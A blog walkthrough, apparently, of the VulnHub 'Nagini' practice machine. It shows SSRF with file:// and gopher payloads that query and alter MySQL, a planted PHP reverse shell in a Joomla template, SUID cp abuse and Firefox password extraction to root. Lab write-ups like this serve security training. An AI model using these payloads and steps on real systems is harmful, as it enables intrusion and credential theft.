


<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width,inital-scale=1,user-scalable=no">
  <title>Nagini靶机完整版 [ Hexo ]</title>
  <!-- bootstrapcss文件 -->
 <!--  <link rel="stylesheet" href="https://cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous"> -->
<!--   
<link rel="stylesheet" href="/css/zhl.css">

 -->
  
    <!-- stylesheets list from config.yml -->
    
      <link rel="stylesheet" href="/css/fork-awesome.min.css">
    
      <link rel="stylesheet" href="/css/zhl.css">
    
  
  
<meta name="generator" content="Hexo 6.3.0"></head>
<body>
<div class="container-fluid">
  <div class="row">
  <div id="wrap" class="col-md-12">
    <div id="header">
	<div id="header-left">
	<h1 id="header-title"> 
	<a href="/">
		Hexo
	</a>
	</h1>
	
	</div>
	<div id="header-right">
		
		
		<a href="/"  title="home"><i class="fa fa-home ">home</i></a>
		
		<a target="_blank" rel="noopener" href="https://github.com/moyan222/moyan222.github.io"  title="demo"><i class="fa fa-code ">demo</i></a>
		
		<a href="/about"  title="about"><i class="fa fa-user ">about</i></a>
		
		<a href="/"  title="music"><i class="fa fa-music ">music</i></a>
		
		
	</div>
</div>

  </div>
  </div>
  <div id="content" class="row">
    <div id="content-left" class="col-md-4">
      

	

	
	<div class="widget-wrap">
		<h3 class="widget-title fa fa-tags">标签</h3>
		<div class="widget tags">
		<a class="tag-span-link" href="/tags/ACL/" rel="tag">ACL<span class="tag-span-count">1</span></a> <a class="tag-span-link" href="/tags/ARP%E6%8A%93%E5%8C%85/" rel="tag">ARP抓包<span class="tag-span-count">1</span></a> <a class="tag-span-link" href="/tags/HTML/" rel="tag">HTML<span class="tag-span-count">6</span></a> <a class="tag-span-link" href="/tags/JS/" rel="tag">JS<span class="tag-span-count">5</span></a> <a class="tag-span-link" href="/tags/PHP/" rel="tag">PHP<span class="tag-span-count">2</span></a> <a class="tag-span-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入<span class="tag-span-count">8</span></a> <a class="tag-span-link" href="/tags/STP/" rel="tag">STP<span class="tag-span-count">1</span></a> <a class="tag-span-link" href="/tags/VLAN/" rel="tag">VLAN<span class="tag-span-count">2</span></a> <a class="tag-span-link" href="/tags/http%E8%AF%B7%E6%B1%82-%E7%81%AB%E7%8B%90%E4%BB%A3%E7%90%86%E5%AE%89%E8%A3%85/" rel="tag">http请求+火狐代理安装<span class="tag-span-count">1</span></a> <a class="tag-span-link" href="/tags/markdown%E8%AF%AD%E6%B3%95/" rel="tag">markdown语法<span class="tag-span-count">1</span></a> <a class="tag-span-link" href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" rel="tag">信息收集<span class="tag-span-count">8</span></a> <a class="tag-span-link" href="/tags/%E5%85%B3%E4%BA%8E%E4%B8%BB%E9%A2%98/" rel="tag">关于主题<span class="tag-span-count">1</span></a> <a class="tag-span-link" href="/tags/%E5%88%86%E4%BA%AB%E7%AC%94%E8%AE%B0/" rel="tag">分享笔记<span class="tag-span-count">4</span></a> <a class="tag-span-link" href="/tags/%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%90%AD%E5%BB%BA/" rel="tag">博客的搭建<span class="tag-span-count">1</span></a> <a class="tag-span-link" href="/tags/%E5%9B%BE%E5%BA%8A%E7%9A%84%E6%90%AD%E5%BB%BA/" rel="tag">图床的搭建<span class="tag-span-count">1</span></a> <a class="tag-span-link" href="/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" rel="tag">应急响应-流量分析<span class="tag-span-count">1</span></a> <a class="tag-span-link" href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" rel="tag">数据库<span class="tag-span-count">3</span></a> <a class="tag-span-link" href="/tags/%E6%95%B0%E6%8D%AE%E9%80%9A%E4%BF%A1%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/" rel="tag">数据通信网络基础<span class="tag-span-count">6</span></a> <a class="tag-span-link" href="/tags/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/" rel="tag">永恒之蓝<span class="tag-span-count">2</span></a> <a class="tag-span-link" href="/tags/%E6%BC%8F%E6%B4%9E/" rel="tag">漏洞<span class="tag-span-count">1</span></a> <a class="tag-span-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag">漏洞复现<span class="tag-span-count">2</span></a> <a class="tag-span-link" href="/tags/%E7%AB%AF%E5%8F%A3/" rel="tag">端口<span class="tag-span-count">1</span></a> <a class="tag-span-link" href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/" rel="tag">计算机基础<span class="tag-span-count">1</span></a> <a class="tag-span-link" href="/tags/%E9%93%BE%E8%B7%AF%E8%81%9A%E5%90%88/" rel="tag">链路聚合<span class="tag-span-count">1</span></a> <a class="tag-span-link" href="/tags/%E9%9D%99%E6%80%81%E8%B7%AF%E7%94%B1/" rel="tag">静态路由<span class="tag-span-count">1</span></a> <a class="tag-span-link" href="/tags/%E9%9D%B6%E6%9C%BA%E7%AC%94%E8%AE%B0/" rel="tag">靶机笔记<span class="tag-span-count">9</span></a>
		</div>
	</div>


	
	<div class="widget-wrap">
		<h3 class="widget-title fa fa-archive">归档</h3>
		<div class="widget">
			<ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/">2023</a><span class="archive-list-count">73</span></li></ul>
		</div>
	</div>



    </div>
    <div id="content-right" class="col-md-8">
    
<article id="post">
	<div class="post-title">
  <h1>Nagini靶机完整版</h1>
  	</div>
  <div class="page-meta">
  	<span class="fa-wrap">
  		<i class="fa fa-clock-o"></i>
  		<span class="date-meta">2023-10-28</span>
  	</span>
  	<span class="fa-wrap">
  		
  		<i class="fa fa-tags"></i>
  		<span class="tags-meta">靶机笔记</span>
  		
  	</span>
  	<span class="fa-wrap">
  		
  	</span>
  </div>
  <div class="post-content">
  <p><strong>0x01</strong> <strong>下载地址</strong></p>
<p><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/harrypotter-nagini,689/">https://www.vulnhub.com/entry/harrypotter-nagini,689/</a></p>
<p><strong>0x02</strong> <strong>靶机目标</strong></p>
<p>获取root权限+3flag</p>
<p><strong>0x03</strong> <strong>工具准备</strong></p>
<ul>
<li><p>quiche：HTTP3访问客户端</p>
</li>
<li><ul>
<li>下载地址：<a target="_blank" rel="noopener" href="https://github.com/cloudflare/quiche">https://github.com/cloudflare/quiche</a></li>
</ul>
</li>
<li><p>gohperus：gohper查询语句生成工具</p>
</li>
<li><ul>
<li>下载地址：<a target="_blank" rel="noopener" href="https://github.com/tarunkant/Gopherus">https://github.com/tarunkant/Gopherus</a></li>
</ul>
</li>
<li><p>firefox_decrypt：firefox信息提取工具</p>
</li>
<li><ul>
<li>下载地址：<a target="_blank" rel="noopener" href="https://github.com/unode/firefox_decrypt">https://github.com/unode/firefox_decrypt</a></li>
</ul>
</li>
</ul>
<p><strong>0x04</strong> <strong>详细步骤</strong> </p>
<p><strong>一、主机发现</strong></p>
<p>sudo arp-scan -l</p>
<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282133140.png" alt="img"></p>
<p><strong>二、端口扫描</strong></p>
<p>sudo nmap -p- 10.0.0.20</p>
<p>sudo nmap -p22,80 -sC -sV 10.0.0.20</p>
<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282133274.png" alt="img"></p>
<p><strong>三、Web信息收集</strong></p>
<p>浏览器访问<a target="_blank" rel="noopener" href="http://10.0.0.20/">http://10.0.0.20/</a></p>
<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282133963.png" alt="img"></p>
<p>查看页面源码，没有发现更多的信息</p>
<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282133198.png" alt="img"></p>
<p>执行目录扫描，发现存在&#x2F;joomla&#x2F;administrator和&#x2F;joomla工作目录</p>
<p>dirsearch -u <a target="_blank" rel="noopener" href="http://10.0.0.20/">http://10.0.0.20</a></p>
<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282133005.png" alt="img"></p>
<p>浏览器访问<a target="_blank" rel="noopener" href="http://10.0.0.20/joomla/%E5%92%8Chttp://10.0.0.20/joomla/administrator/">http://10.0.0.20/joomla/和http://10.0.0.20/joomla/administrator/</a></p>
<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282133915.png" alt="img"></p>
<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282133386.png" alt="img"></p>
<p>通过简单弱口令测试，并没有什么收获，故尝试使用更进一步的目录扫描</p>
<p>dirsearch -u <a target="_blank" rel="noopener" href="http://10.0.0.20/">http://10.0.0.20</a> -f -e html,php,txt -w &#x2F;usr&#x2F;share&#x2F;seclists&#x2F;Discovery&#x2F;Web-Content&#x2F;directory-list-2.3-small.txt</p>
<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282134181.png" alt="img"></p>
<p>发现了存在<a target="_blank" rel="noopener" href="http://10.0.0.20/note.txt%E6%96%87%E4%BB%B6%EF%BC%8C%E6%A0%B9%E6%8D%AE%E6%96%87%E4%BB%B6%E6%8F%90%E7%A4%BA%E9%9D%B6%E6%9C%BA%E9%9C%80%E8%A6%81%E4%BD%BF%E7%94%A8quic.nagini.hogwarts%E4%B8%BB%E6%9C%BA%E5%A4%B4%E8%BF%9B%E8%A1%8C%E9%80%9A%E8%AE%AF%EF%BC%8C%E5%B9%B6%E4%BD%BF%E7%94%A8http3%E5%8D%8F%E8%AE%AE%E3%80%82">http://10.0.0.20/note.txt文件，根据文件提示靶机需要使用quic.nagini.hogwarts主机头进行通讯，并使用http3协议。</a></p>
<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282134783.png" alt="img"></p>
<p>故在Kali主机中把quic.nagini.hogwarts做IP绑定</p>
<p>sudo vi &#x2F;etc&#x2F;hosts</p>
<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282134792.png" alt="img"></p>
<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282134825.png" alt="img"></p>
<p>使用浏览器访问<a target="_blank" rel="noopener" href="https://quic.nagini.hogwarts/%EF%BC%8C%E5%8F%91%E7%8E%B0%E6%97%A0%E6%B3%95%E8%AE%BF%E9%97%AEhttp3%E7%9A%84%E7%BD%91%E7%AB%99">https://quic.nagini.hogwarts/，发现无法访问http3的网站</a></p>
<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282134268.png" alt="img"></p>
<p><strong>如何访问http3的网站</strong></p>
<ol>
<li>quiche客户端程序</li>
<li>重新编译cURL客户端程序，包含支持http3组件</li>
</ol>
<p>这里选择安装quiche客户端</p>
<p><strong>Quiche****客户端安装</strong></p>
<p>安装命令</p>
<p>git clone –recursive <a target="_blank" rel="noopener" href="https://github.com/cloudflare/quiche">https://github.com/cloudflare/quiche</a></p>
<p>cp -r quiche &#x2F;tmp</p>
<p>cd &#x2F;tmp&#x2F;quiche</p>
<p>sudo apt install cmake -y</p>
<p>curl –proto ‘&#x3D;https’ –tlsv1.2 -sSf <a target="_blank" rel="noopener" href="https://sh.rustup.rs/">https://sh.rustup.rs</a> | sh #下载官方版本的rustc</p>
<p>1 #软件安装选项</p>
<p>source $HOME&#x2F;.cargo&#x2F;env #根据安装提示执行该命令</p>
<p>git submodule update –init</p>
<p>cargo build –examples #再次build</p>
<p>cargo test #测试安全</p>
<p>bulid的结果：</p>
<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282134158.png" alt="img"></p>
<p>test的结果：</p>
<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282134233.png" alt="img"></p>
<p>查看安装好的http3客户端</p>
<p>cd target&#x2F;debug&#x2F;examples</p>
<p>ls -l http3-client</p>
<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282134159.png" alt="img"></p>
<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282134161.png" alt="img"></p>
<p>通过http3客户端访问quic.nagini.hogwarts看到如下信息</p>
<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282134390.png" alt="img"></p>
<p>根据提示信息得知目标靶机上存在&#x2F;internalResourceFeTcher.php文件和配置文件的备份文件.bak。</p>
<p>用浏览器访问<a target="_blank" rel="noopener" href="http://10.0.0.20/internalResourceFeTcher.php%EF%BC%8C%E7%A1%AE%E5%AE%9E%E5%AD%98%E5%9C%A8%E8%BF%99%E6%A0%B7%E7%9A%84%E9%A1%B5%E9%9D%A2">http://10.0.0.20/internalResourceFeTcher.php，确实存在这样的页面</a></p>
<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282134907.png" alt="img"></p>
<p>在输入框尝试输入file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd，并可以访问&#x2F;etc&#x2F;passwd文件</p>
<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282134805.png" alt="img"></p>
<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282134537.png" alt="img"></p>
<p>在输入框尝试输入<a target="_blank" rel="noopener" href="http://127.0.0.1,并可以访问主站页面/">http://127.0.0.1，并可以访问主站页面</a></p>
<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282134181.png" alt="img"></p>
<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282134418.png" alt="img"></p>
<p>由此可以确认该站点存在SSRF漏洞</p>
<p><strong>五、SSRF漏洞&amp;Gopher协议</strong></p>
<p>SSRF服务端请求伪造：使服务器可作为跳板攻击内网的其他主机。</p>
<p>Gopher协议：一种早期互联网查找协议，可以访问任何tcp服务。</p>
<p>在输入框尝试输入gopher:&#x2F;&#x2F;127.0.0.1:22，可以访问SSH回显信息</p>
<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282135548.png" alt="img"></p>
<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282135961.png" alt="img"></p>
<p>通过Gopher的回显机制，结合Burpsuite可以对内网进行扫描，进而渗透内网。</p>
<p>根据第二条提示，直接访问<a target="_blank" rel="noopener" href="http://10.0.0.20/joomla/configuration.php.bak">http://10.0.0.20\joomla\configuration.php.bak</a></p>
<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282135111.png" alt="img"></p>
<p>可以直接下载备份配置文件</p>
<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282135814.png" alt="img"></p>
<p>得知靶机后台存在Mysql数据库，且数据库连接用户名为goblin，密码为空</p>
<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282135868.png" alt="img"></p>
<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282135806.png" alt="img"></p>
<p>故尝试使用Gopher协议直接连接后端Mysql数据库，查询joomlaCMS管理员密码</p>
<p>下载Gopherus工具</p>
<p>git clone <a target="_blank" rel="noopener" href="https://github.com/tarunkant/Gopherus.git">https://github.com/tarunkant/Gopherus.git</a></p>
<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282135059.png" alt="img"></p>
<p>使用Gopherus工具生成查询代码</p>
<p>.&#x2F;gopherus.py –exploit mysql</p>
<p>goblin</p>
<p>use joomla; show tables;</p>
<p>gopher:&#x2F;&#x2F;127.0.0.1:3306&#x2F;_%a5%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%67%6f%62%6c%69%6e%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%19%00%00%00%03%75%73%65%20%6a%6f%6f%6d%6c%61%3b%20%73%68%6f%77%20%74%61%62%6c%65%73%3b%01%00%00%00%01</p>
<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282135749.png" alt="img"></p>
<p>将生成的代码放入查询框：</p>
<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282135461.png" alt="img"></p>
<p>经过5次的提交，系统回显结果</p>
<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282135499.png" alt="img"></p>
<p>核对以上信息，发现关键表名:</p>
<p>joomla_users</p>
<p>再次生成查询语句</p>
<p>.&#x2F;gopherus.py –exploit mysql</p>
<p>goblin</p>
<p>use joomla; select * from joomla_users;</p>
<p>gopher:&#x2F;&#x2F;127.0.0.1:3306&#x2F;_%a5%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%67%6f%62%6c%69%6e%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%28%00%00%00%03%75%73%65%20%6a%6f%6f%6d%6c%61%3b%20%73%65%6c%65%63%74%20%2a%20%66%72%6f%6d%20%6a%6f%6f%6d%6c%61%5f%75%73%65%72%73%3b%01%00%00%00%01</p>
<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282135905.png" alt="img"></p>
<p>经过5次的提交，系统回显结果</p>
<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282135775.png" alt="img"></p>
<p>获取网站管理员用户名和密码（密文）关键信息</p>
<p>site_admin</p>
<p>$2y$10$cmQ.akn2au104AhR4.YJBOC5W13gyV21D&#x2F;bkoTmbWWqFWjzEW7vay</p>
<p>由于查询（暴力破解）管理员密码比较花费时间，故尝试修改管理员密码更为快捷</p>
<p>生成md5密码</p>
<p>echo -n “123456” | md5sum</p>
<p>e10adc3949ba59abbe56e057f20f883e</p>
<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282135614.png" alt="img"></p>
<p>再次生成查询语句</p>
<p>.&#x2F;gopherus.py –exploit mysql</p>
<p>goblin</p>
<p>use joomla; update joomla_users set password&#x3D;’e10adc3949ba59abbe56e057f20f883e’ where username&#x3D;’site_admin’;</p>
<p>gopher:&#x2F;&#x2F;127.0.0.1:3306&#x2F;_%a5%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%67%6f%62%6c%69%6e%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%6d%00%00%00%03%75%73%65%20%6a%6f%6f%6d%6c%61%3b%20%75%70%64%61%74%65%20%6a%6f%6f%6d%6c%61%5f%75%73%65%72%73%20%73%65%74%20%70%61%73%73%77%6f%72%64%3d%27%65%31%30%61%64%63%33%39%34%39%62%61%35%39%61%62%62%65%35%36%65%30%35%37%66%32%30%66%38%38%33%65%27%20%77%68%65%72%65%20%75%73%65%72%6e%61%6d%65%3d%27%73%69%74%65%5f%61%64%6d%69%6e%27%3b%01%00%00%00%01</p>
<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282135637.png" alt="img"></p>
<p>重复提交6次语句</p>
<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282136330.png" alt="img"></p>
<p>在<a target="_blank" rel="noopener" href="http://10.0.0.20/joomla/administrator/index.php%E5%90%8E%E5%8F%B0%E5%B0%9D%E8%AF%95%E7%99%BB%E5%BD%95%EF%BC%8C%E7%99%BB%E5%BD%95%E6%88%90%E5%8A%9F">http://10.0.0.20/joomla/administrator/index.php后台尝试登录，登录成功</a></p>
<p>site_admin&amp;123456</p>
<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282136789.png" alt="img"></p>
<p><strong>六、获取WebShell</strong></p>
<p>修改Joomla模板，写入WebShell</p>
<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282136763.png" alt="img"></p>
<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282136522.png" alt="img"></p>
<p>选择error.php文件，清空其内容</p>
<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282136037.png" alt="img"></p>
<p>准备WebShell文件，配置反弹地址</p>
<p>cp &#x2F;usr&#x2F;share&#x2F;webshells&#x2F;php&#x2F;php-reverse-shell.php .</p>
<p>vi php-reverse-shell.php</p>
<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282136612.png" alt="img"></p>
<p>将准备好的代码放入CMS中，点击save</p>
<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282136144.png" alt="img"></p>
<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282136978.png" alt="img"></p>
<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282136629.png" alt="img"></p>
<p>本地监听5555端口</p>
<p>nc -lnvp 5555</p>
<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282136801.png" alt="img"></p>
<p>浏览器访问<a target="_blank" rel="noopener" href="http://10.0.0.20/joomla/templates/protostar/error.php">http://10.0.0.20/joomla/templates/protostar/error.php</a></p>
<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282136604.png" alt="img"></p>
<p>WebShell获取成功，升级Shell</p>
<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282136037.png" alt="img"></p>
<p><strong>七、主机信息收集与提权</strong></p>
<p>ls &#x2F;home</p>
<p>cd &#x2F;home&#x2F;snape</p>
<p>ls -al</p>
<p>cat .creds.txt</p>
<p>TG92ZUBsaWxseQ&#x3D;&#x3D;</p>
<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282136290.png" alt="img"></p>
<p>解密密文</p>
<p>echo “TG92ZUBsaWxseQ&#x3D;&#x3D;” | base64 -d</p>
<p>Love@lilly</p>
<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282136897.png" alt="img"></p>
<p>ssh远程登录主机</p>
<p>ssh <a href="mailto:&#x73;&#110;&#97;&#112;&#101;&#64;&#49;&#x30;&#x2e;&#x30;&#46;&#48;&#x2e;&#x32;&#x30;">&#x73;&#110;&#97;&#112;&#101;&#64;&#49;&#x30;&#x2e;&#x30;&#46;&#48;&#x2e;&#x32;&#x30;</a></p>
<p>Love@lilly</p>
<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282137338.png" alt="img"></p>
<p><strong>flag1</strong></p>
<p>cat &#x2F;var&#x2F;www&#x2F;html&#x2F;horcrux1.txt</p>
<p>horcrux_{MzogU2x5dGhFcmlOJ3MgTG9jS0VldCBkRXN0cm9ZZUQgYlkgUm9O}</p>
<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282137864.png" alt="img"></p>
<p><strong>flag2****获取与权限获取</strong></p>
<p>cd &#x2F;home&#x2F;hermoine&#x2F;</p>
<p>ls -al</p>
<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282137677.png" alt="img"></p>
<p>cd bin&#x2F;</p>
<p>ls -al</p>
<p>发现该程序是开启了SUID权限的cp程序</p>
<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282137845.png" alt="img"></p>
<p>提权思路为：</p>
<ul>
<li>kali本机生成ssh公钥对</li>
<li>将公钥上传靶机，并使用su_cp复制到hermine用户.ssh目录下</li>
<li>实现无需密码ssh登录hermine用户</li>
</ul>
<p>kali本机生成ssh公钥对</p>
<p>ssh-keygen</p>
<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282137929.png" alt="img"></p>
<p>查看生成的公钥对</p>
<p>cd .ssh</p>
<p>ls -al</p>
<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282137766.png" alt="img"></p>
<p>上传至目标主机</p>
<p>scp id_rsa.pub <a href="mailto:&#x73;&#110;&#x61;&#x70;&#x65;&#64;&#x31;&#x30;&#x2e;&#x30;&#46;&#48;&#46;&#50;&#48;">&#x73;&#110;&#x61;&#x70;&#x65;&#64;&#x31;&#x30;&#x2e;&#x30;&#46;&#48;&#46;&#50;&#48;</a>:~&#x2F;</p>
<p>Love@lilly</p>
<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282137109.png" alt="img"></p>
<p>修改上传的公钥文件名称，并赋权，拷贝到hermoine&#x2F;.ssh目录下</p>
<p>mv ~&#x2F;id_rsa.pub ~&#x2F;authorized_keys</p>
<p>chmod 640 ~&#x2F;authorized_keys</p>
<p>.&#x2F;su_cp ~&#x2F;authorized_keys &#x2F;home&#x2F;hermoine&#x2F;.ssh</p>
<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282137016.png" alt="img"></p>
<p>使用heromine用户远程登录主机</p>
<p>ssh <a href="mailto:&#104;&#x65;&#x72;&#109;&#x6f;&#x69;&#x6e;&#101;&#x40;&#x31;&#48;&#46;&#48;&#46;&#x30;&#46;&#x32;&#48;">&#104;&#x65;&#x72;&#109;&#x6f;&#x69;&#x6e;&#101;&#x40;&#x31;&#48;&#46;&#48;&#46;&#x30;&#46;&#x32;&#48;</a></p>
<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282137969.png" alt="img"></p>
<p>获取flag2</p>
<p>cat horcrux2.txt </p>
<p>horcrux_{NDogSGVsZ2EgSHVmZmxlcHVmZidzIEN1cCBkZXN0cm95ZWQgYnkgSGVybWlvbmU&#x3D;}</p>
<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282137323.png" alt="img"></p>
<p><strong>八、Root提权</strong></p>
<p>发现hermoine账户下存在.mozilla目录，这个目录是存在firefox浏览器相关信息，故将该目录拷贝到kali本地进行分析</p>
<p>scp -rp <a href="mailto:&#x68;&#x65;&#x72;&#x6d;&#x6f;&#105;&#x6e;&#101;&#64;&#49;&#x30;&#46;&#48;&#x2e;&#48;&#46;&#50;&#x30;">&#x68;&#x65;&#x72;&#x6d;&#x6f;&#105;&#x6e;&#101;&#64;&#49;&#x30;&#46;&#48;&#x2e;&#48;&#46;&#50;&#x30;</a>:~&#x2F;.mozilla &#x2F;tmp</p>
<p>cd &#x2F;tmp</p>
<p>ls -al</p>
<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282137693.png" alt="img"></p>
<p>下载firefox_decrypt，并使用工具</p>
<p>git clone <a target="_blank" rel="noopener" href="https://github.com/unode/firefox_decrypt.git">https://github.com/unode/firefox_decrypt.git</a></p>
<p>cd firefox_decrypt</p>
<p>python3 firefox_decrypt.py &#x2F;tmp&#x2F;.mozilla&#x2F;firefox</p>
<p>Website:  <a target="_blank" rel="noopener" href="http://nagini.hogwarts/">http://nagini.hogwarts</a></p>
<p>Username: ‘root’</p>
<p>Password: ‘@Alohomora#123’</p>
<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282137692.png" alt="img"></p>
<p>ssh登录系统，获取root权限</p>
<p>ssh <a href="mailto:&#x72;&#111;&#x6f;&#x74;&#64;&#x31;&#x30;&#46;&#x30;&#46;&#x30;&#46;&#x32;&#48;">&#x72;&#111;&#x6f;&#x74;&#64;&#x31;&#x30;&#46;&#x30;&#46;&#x30;&#46;&#x32;&#48;</a></p>
<p>@Alohomora#123</p>
<p><img src="https://raw.githubusercontent.com/moyan222/image123/main/img/202310282137465.png" alt="img"></p>
<p><strong>flag3</strong></p>
<p>cat &#x2F;root&#x2F;horcrux3.txt</p>
<hr>
<p> &#x2F; <em><strong>|</strong></em> _ __  __ _ _ __ __ <em>| |</em> _  <em>| | __ <em>| |</em>(</em>) ___ _ __ ___ </p>
<p>| |  &#x2F; _ | ‘_ \ &#x2F; _<code> | &#39;__/ _</code> | __| | | | |&#x2F; _&#96; | _<em>| |&#x2F; _ | ‘</em> / __|</p>
<p>| |_<em>| (</em>) | | | | (<em>| | | | (</em>| | |<em>| |</em>| | | (<em>| | |</em>| | (<em>) | | | _</em> \</p>
<p> _<em><strong>_</strong>&#x2F;|</em>| |<em>|_</em>, |<em>| _</em>,<em>|_</em>|_<em>,</em>|<em>|_</em>,<em>|_</em>|<em>|___&#x2F;|</em>| |<em>|</em>__&#x2F;</p>
<p>​         |___&#x2F;                         </p>
<p>Machine Author: Mansoor R (@time4ster)</p>
<p>Machine Difficulty: Medium</p>
<p>Machine Name: Nagini</p>
